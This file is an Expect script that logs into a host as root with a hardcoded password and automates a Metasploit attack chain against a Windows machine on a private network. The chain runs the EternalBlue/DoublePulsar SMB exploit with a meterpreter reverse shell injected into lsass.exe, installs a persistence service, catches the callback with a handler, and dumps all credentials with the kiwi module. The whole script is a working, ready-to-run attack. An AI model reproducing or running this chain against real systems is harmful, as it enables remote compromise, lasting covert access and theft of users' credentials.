#!/usr/bin/expect -f

set delKnownHosts "del_known_hosts.sh"
set ip "192.168.1.106"
set username "root"
set password "qsefthuk"

set timeout 15

spawn /bin/bash $delKnownHosts
send "exit\r"

spawn ssh $username@$ip
expect "*continue connecting (yes/no*)? "
send "yes\r"
expect " password: "
send "$password\r"


expect "*:~#"
send "msfconsole\r"
sleep 15
expect "*:~#"
send "use exploits/windows/smb/eternalblue_doublepulsar\r"
expect "*:~#"
send "set payload windows/x64/meterpreter/reverse_tcp\r"
expect "*:~#"
send "set PROCESSINJECT lsass.exe\r"
expect "*:~#"
send "set RHOSTS 192.168.1.110\r"
expect "*:~#"
send "run\r"
sleep 30
expect "*:~#"
send "background\r"
expect "*:~#"
send "back\r"
expect "*:~#"
send "use exploit/windows/local/persistence_service\r"
expect "*:~#"
send "set session 1\r"
expect "*:~#"
send "set lport 5678\r"
expect "*:~#"
send "set remote_exe_name virus_test\r"
expect "*:~#"
send "set service_name virus_service\r"
expect "*:~#"
send "run\r"
sleep 15
expect "*:~#"
send "background\r"
expect "*:~#"
send "back\r"
expect "*:~#"
send "sessions -K\r"
expect "*:~#"
send "use exploit/multi/handler\r"
expect "*:~#"
send "set payload windows/meterpreter/reverse_tcp\r"
expect "*:~#"
send "set lport 5678\r"
expect "*:~#"
send "set lhost 192.168.1.106\r"
expect "*:~#"
send "run\r"
sleep 10
expect "*:~#"
send "load kiwi\r"
expect "*:~#"
send "creds_all\r"
sleep 30
expect "*:~#"
send "exit\r"


